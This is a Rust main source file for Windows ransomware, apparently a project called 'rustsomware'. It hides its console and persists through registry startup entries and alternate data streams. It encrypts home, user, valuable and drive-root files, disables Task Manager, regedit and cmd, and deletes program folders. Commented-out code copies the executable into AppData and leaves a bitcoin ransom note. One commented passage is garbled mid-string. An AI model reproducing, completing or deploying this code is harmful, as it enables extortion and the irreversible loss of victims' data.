#![windows_subsystem = "windows"] // hides execution console
mod encryption;
mod smart_dir;
mod system_changer;
use aes_gcm_siv::aead::generic_array::typenum::Len;
use aes_gcm_siv::aead::{Aead, NewAead};
use aes_gcm_siv::{Aes128GcmSiv, Aes256GcmSiv, Key, Nonce};
use dirs;
use encryption::encryptor;
use encryption::key_gen;
use fs_extra;
use mountpoints;
use mslnk::ShellLink;
use rand::prelude::*;
use rand_hc::Hc128Rng;
use smart_dir::dir_list;
use std::collections::{HashMap, HashSet};
use std::fs;
use std::io;
use std::path;
use std::path::Path;
use std::process::{Command, Stdio};
use std::str;
use std::thread;
use std::time;
use sysinfo::{NetworkExt, NetworksExt, ProcessExt, RefreshKind, System, SystemExt};
use system_changer::registry_changer;
use walkdir::WalkDir;

// powershell -command "(expand path_to_stream path_to_output) -and (.\path_to_output)"
// leave the file where it was extracted.
// try make the few current user registry changes in the local machine if possible
// check notes if there are still any critical changes for stability to be done
// afterwards move on to filling the desktop with files about how to get the data back.

fn main() {
    /*
    let exec_name = match registry_changer::get_exec_name() {
        Some(name) => name,
        None => return,
    };

    println!("Exec name: {}", &exec_name);

    // Copy the program to a different path
    match dir_list::get_home_dir() {
        Some(dir) => {
            let destination = dir.clone() + "\\AppData\\Roaming\\rustsomware\\";
            let target = dir.clone() + "\\AppData\\Roaming\\rustsomware\\rustsomware.exe";
            let lnk = target.clone() + ".lnk";
            fs::create_dir(&destination);
            fs::copy(&exec_name, &target).unwrap();
            println!("Fully copied exe.")
        }
        None => println!("No dir with home dir data!"),
    }

    println!("Finished prograchris titus tech
        "C:\\Users\\Administrator\\Desktop\\OpenMeInNotepad.rustsw",
        "In order to receive decryption key and instructions send bitcoin here: XXdfsfAHJflh39",
    );*/
    /*
    registry_changer::start_ransomware_on_startup_alternate_data_stream();

    let command =
        format!("wmic process call create '\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"'");
    Command::new("cmd")
        .args([
            "/c",
            "start",
            "/min",
            "cmd",
            "/c",
            "powershell",
            "-WindowStyle",
            "Hidden",
            "-NonInteractive",
            "-NoLogo",
            "-Command",
            &command,
        ])
        .spawn();*/

    let use_alternate_data_stream = true;

    // Adds program to startup
    if use_alternate_data_stream {
        registry_changer::start_ransomware_on_startup_alternate_data_stream();
    } else {
        registry_changer::start_ransomware_on_startup_classic();
    }

    // Gets the folders to be encrypted on all the mounted drives in order of importance.
    let mut folders_to_encrypt = Vec::new();
    dir_list::add_valuable_folder_paths_windows(&mut folders_to_encrypt);

    // Gets the folders to be deleted (the ones with non sensitive information)
    let mut unwanted_folders = vec![];
    dir_list::add_non_valuable_folder_paths_windows(&mut unwanted_folders);

    // Creates an encryptor from strong generated keys.
    let mut key_gen = key_gen::KeyGen::from(Hc128Rng::from_entropy());
    let key_bytes = key_gen.gen_key_bytes_128bits();
    let nonce_bytes = key_gen.gen_nonce_bytes();
    let encryptor = encryptor::Encryptor128bit::from(key_bytes, nonce_bytes);

    // First encrypts the files in the home folder (no sub directories).
    match dir_list::get_home_dir() {
        Some(dir) => {
            encryptor.attempt_encrypt_files_in_dir(&dir);

            for user in dir_list::get_users_windows() {
                if &user != &dir {
                    encryptor.attempt_encrypt_files_in_dir(&user);
                }
            }
        }
        None => (),
    }

    // Registry changes to block windows features like task manager, regedit, cmd, change user and many others.
    registry_changer::lock_down_system();

    // Restart explorer.exe in order for registry changes to apply
    restart_explorer();

    // Second encrypts in the vector we got at the start.
    for path in folders_to_encrypt {
        encryptor.encrypt_dir(&path);
    }

    // Third encrypts the files in the root folder of every drive, least likely location to be important files in.
    match mountpoints::mountpaths() {
        Ok(mountpaths) => {
            for mountpath in &mountpaths {
                match fs::read_dir(&mountpath) {
                    Ok(dir_read) => {
                        let mut files = vec![];
                        for entry in dir_read.filter_map(|file| file.ok()) {
                            let path = &entry.path();

                            if path.is_file() {
                                let path_str = match path.to_str() {
                                    Some(path_str) => path_str,
                                    None => continue,
                                };

                                let path_string = path_str.to_owned();
                                files.push(path_string);
                            }
                        }
                        encryptor.encrypt_files(&files);
                    }
                    Err(_) => (),
                }
            }
        }
        Err(_) => (),
    }

    // Forth deletes games folders and program folders. (basically folders that don't have sensitive information)
    encryptor.delete_files_in_dirs(&unwanted_folders);

    // Restart explorer.exe in order to refresh the system for the deleted apps.
    restart_explorer();

    // HACK keeping window opened for debugging purposes.
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf);
    /*
    for path in common_folder_paths {
        println!("{}", path);
    }*/
    /*
    // Adds pictures folder path to the vec
    let public_path = match dirs::public_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    for file in WalkDir::new("C:\\Users\\Administrator\\AppData")
        .into_iter()
        .filter_map(|file| file.ok())
    {
        if file.metadata().unwrap().is_file() {
            println!("{}", file.path().display());
        }
    }*/
    /*

    let mut sys = System::new_with_specifics(RefreshKind::new().with_disks_list());
    for disk in sys.disks() {
        let t = disk.to_owned()
        println!("{:?}", disk);
    }*/
    /*
    let sys = System::new_all();
    for disk in sys.disks() {
        println!("{:?}", disk);
    }*/
}

fn restart_explorer() {
    Command::new("taskkill")
        .arg("/f")
        .arg("/im")
        .arg("explorer.exe")
        .spawn();
    thread::sleep(time::Duration::from_secs(1));
    Command::new("explorer.exe").spawn();
}
